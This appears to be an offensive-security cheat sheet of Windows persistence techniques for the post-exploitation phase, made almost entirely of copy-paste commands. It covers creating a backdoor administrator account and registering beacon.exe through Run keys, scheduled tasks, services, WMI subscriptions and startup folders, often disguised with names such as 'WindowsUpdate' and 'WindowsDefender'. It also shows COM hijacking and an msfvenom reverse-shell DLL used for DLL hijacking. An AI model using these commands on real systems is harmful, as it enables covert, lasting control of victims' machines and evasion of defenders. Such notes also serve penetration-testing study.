# Windows Persistence

**Tags:** #persistence #windows #post-exploitation
**Phase:** Post-PrivEsc → Sustained Access

---

## Add Admin User

```cmd
net user backdoor P@ssw0rd123! /add
net localgroup administrators backdoor /add
net localgroup "Remote Desktop Users" backdoor /add

# PowerShell
$pass = ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force
New-LocalUser "backdoor" -Password $pass -FullName "System"
Add-LocalGroupMember -Group "Administrators" -Member "backdoor"
```

## Registry Run Keys

```cmd
# Per-user (HKCU — no admin needed)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /t REG_SZ /d "C:\Windows\Temp\beacon.exe" /f

# System-wide (requires admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /t REG_SZ /d "C:\Windows\Temp\beacon.exe" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Setup /t REG_SZ /d "C:\Temp\setup.exe" /f

# PowerShell
Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Update" -Value "C:\Temp\beacon.exe"
```

## Scheduled Tasks

```cmd
# Basic — run at logon as SYSTEM
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\beacon.exe" /sc onlogon /ru SYSTEM /f

# Run every minute
schtasks /create /tn "Updater" /tr "powershell -enc BASE64" /sc minute /mo 1 /ru SYSTEM /f

# Run on startup
schtasks /create /tn "SystemInit" /tr "C:\Temp\beacon.exe" /sc onstart /ru SYSTEM /f

# Verify
schtasks /query /tn "WindowsUpdate" /fo LIST /v

# PowerShell
$action = New-ScheduledTaskAction -Execute "C:\Temp\beacon.exe"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "WindowsDefender" -Action $action -Trigger $trigger -RunLevel Highest -Force
```

## Service Installation

```cmd
sc create WindowsHelper binPath= "C:\Temp\beacon.exe" start= auto DisplayName= "Windows Helper" type= own
sc start WindowsHelper
sc description WindowsHelper "Provides system helper functions"

# PowerShell
New-Service -Name "WindowsHelper" -BinaryPathName "C:\Temp\beacon.exe" -StartupType Automatic
Start-Service WindowsHelper
```

## WMI Event Subscription (Fileless — Survives Reboots)

```powershell
# Create WMI filter + consumer + binding
$EventFilter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name="SystemUpdate"; EventNamespace="root\cimv2";
    QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name="SystemUpdate"; ExecutablePath="C:\Temp\beacon.exe"
}

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter=$EventFilter; Consumer=$Consumer
}
```

## DLL Hijacking (Persistent)

```powershell
# Place malicious DLL in directory searched before legit location
# E.g., if service binary calls LoadLibrary("missing.dll"):
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f dll -o missing.dll
copy missing.dll "C:\writable\service\dir\"
sc restart ServiceName
```

## COM Hijacking (User-Level — No Admin)

```powershell
# Override HKCU COM registration before HKLM
# Example: hijack {GUID} used by scheduled task
New-Item -Path "HKCU:\Software\Classes\CLSID\{GUID}\InprocServer32"
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{GUID}\InprocServer32" -Name "(Default)" -Value "C:\Temp\evil.dll"
```

## Startup Folders

```cmd
# User startup folder
copy beacon.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

# All users (requires admin)
copy beacon.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"

# Via PowerShell
$path = [Environment]::GetFolderPath("Startup")
Copy-Item beacon.exe "$path\updater.exe"
```

## Golden/Silver Ticket (AD — 10 Year Persistence)

```bash
# See: 08-Active-Directory/INDEX — Section 6.2
```

## Related Notes

- [[08-Persistence/Linux-Persistence]] — Linux persistence
- [[08-Active-Directory/INDEX]] — Domain-level persistence
- [[09-Covering-Tracks/Windows-Log-Removal]] — Cover traces
